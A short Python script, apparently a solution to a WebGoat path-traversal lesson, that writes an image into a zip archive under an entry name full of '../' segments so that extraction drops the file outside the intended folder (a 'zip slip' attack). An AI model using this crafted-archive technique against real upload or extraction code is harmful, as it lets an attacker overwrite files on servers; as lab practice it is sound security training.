import zipfile

if __name__ == "__main__":
    zipFile = zipfile.ZipFile("origin.zip", "a", zipfile.ZIP_DEFLATED)
    #zipFile.write("./origin.jpg", "./origin.jpg", zipfile.ZIP_DEFLATED)
    zipFile.write("./origin.jpg", "../../../../../../../../../../Users/luke10481/.webgoat-2023.4/PathTraversal/luke10481/luke10481.jpg", zipfile.ZIP_DEFLATED)
    zipFile.close()
